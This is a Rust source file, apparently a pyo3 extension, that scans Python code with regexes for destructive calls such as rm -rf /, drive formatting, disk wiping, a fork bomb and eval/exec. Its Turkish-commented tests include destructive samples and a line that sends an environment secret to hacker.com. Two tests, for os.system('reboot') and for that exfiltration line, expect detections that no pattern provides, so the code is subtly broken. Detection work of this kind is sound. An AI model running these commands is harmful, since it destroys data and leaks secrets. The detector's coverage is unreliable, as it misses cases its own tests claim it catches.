use once_cell::sync::Lazy;
use regex::Regex;
use pyo3::prelude::*;

static DANGEROUS_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        Regex::new(r#"(?xi) \b shutil\.rmtree \s* \( \s* ['"] \s* / \s* ['"] \s* (?:,|\))"#).unwrap(),
        Regex::new(r#"(?xi) \b (os\.remove | os\.unlink) \s* \( \s* ['"] \s* / \s* ['"] \s* \)"#).unwrap(),
        Regex::new(r#"(?xi) \b (os\.system | subprocess\.(?:call|run|Popen)) \s* \( [^)]* ['"] (?:\s*sudo\s+)? rm \s+ -rf \s+ / \b ['"]"#).unwrap(),
        Regex::new(r#"(?xi) \b (os\.system | subprocess\.(?:call|run|Popen)) \s* \( [^)]* ['"]
            (?:
                powershell(?:\.exe)? \s+ .* Remove-Item \s+ .* \s+ C:\\ \s* $ |
                del \s+ /f \s+ /s \s+ /q \s+ C:\\\* |
                rmdir \s+ /s \s+ /q \s+ C:\\ |
                rd \s+ /s \s+ /q \s+ C:\\
            )
        ['"]"#).unwrap(),

        Regex::new(r#"(?xi) \b (os\.system | subprocess\.(?:call|run|Popen)) \s* \( [^)]* ['"] (?:cmd\s*/c\s+)? format \s+ [A-Z]: ['"]"#).unwrap(),
        Regex::new(r#"(?xi) \b (os\.system | subprocess\.(?:call|run|Popen)) \s* \( [^)]* ['"] dd \s+ if=/dev/zero \s+ of=/dev/sd[a-z]\d? ['"]"#).unwrap(),
        Regex::new(r#"(?xi) \b (os\.system | subprocess\.(?:call|run|Popen)) \s* \( [^)]* ['"] mkfs\.\w+ \s+ /dev/sd[a-z]\d? ['"]"#).unwrap(),
        
        Regex::new(r#"(?xi) \b (os\.system | subprocess\.(?:call|run|Popen)) \s* \( [^)]* ['"] :\(\)\{\s*:\|\:&\s*;\s*\}: ['"]"#).unwrap(),

        Regex::new(r#"(?xi) \b (eval|exec) \s* \("#).unwrap(),
    ]
});

fn analyze_code_internal(code: &str) -> bool {
    !DANGEROUS_PATTERNS.iter().any(|re| re.is_match(code))
}

#[pyfunction]
fn analyze_code(code: &str) -> PyResult<bool> {
    Ok(analyze_code_internal(code))
}

#[pymodule]
fn native_core(_py: Python, m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(analyze_code, m)?)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_os_path_join() {
        let code = "import os\npath = os.path.join('user', 'docs')";
        assert!(analyze_code_internal(code), "os.path.join gibi zararsız os kullanımı artık güvenli olmalı.");
    }

    #[test]
    fn test_safe_shutil_copy() {
        let code = "import shutil\nshutil.copy('a.txt', 'b.txt')";
        assert!(analyze_code_internal(code), "shutil.copy gibi zararsız shutil kullanımı artık güvenli olmalı.");
    }

    #[test]
    fn test_safe_subprocess_for_benign_command() {
        let code = "import subprocess\nsubprocess.run(['ls', '-l'])";
        assert!(analyze_code_internal(code), "Zararsız argümanlarla subprocess kullanımı güvenli olmalı.");
    }

    #[test]
    fn test_dangerous_rmtree_on_root() {
        let code = "import shutil\nshutil.rmtree('/')";
        assert!(!analyze_code_internal(code), "Kök dizinde rmtree tehlikeli olarak algılanmalı.");
    }

    #[test]
    fn test_dangerous_remove_on_root_with_spaces() {
        let code = "import os\nos.remove( '/' )";
        assert!(!analyze_code_internal(code), "Kök dizinde remove tehlikeli olarak algılanmalı.");
    }

    #[test]
    fn test_dangerous_os_system_call() {
        let code = "import os\nos.system('reboot')";
        assert!(!analyze_code_internal(code), "os.system çağrısı her zaman tehlikeli kabul edilmeli.");
    }

    #[test]
    fn test_dangerous_direct_shell_command() {
        let code = "subprocess.run('rm -rf /', shell=True)";
        assert!(!analyze_code_internal(code), "Doğrudan 'rm -rf /' komutu tehlikeli olarak algılanmalı.");
    }
    
    #[test]
    fn test_dangerous_data_exfiltration_pattern() {
        let code = r#"import os, requests; requests.post("http://hacker.com", data=os.environ["SECRET_KEY"])"#;
        assert!(!analyze_code_internal(code), "API anahtarlarını sızdırma girişimi tehlikeli olarak algılanmalı.");
    }

    #[test]
    fn test_dangerous_eval_usage() {
        let code = "user_input = '...'\neval(user_input)";
        assert!(!analyze_code_internal(code), "eval() kullanımı tehlikeli olarak algılanmalı.");
    }
}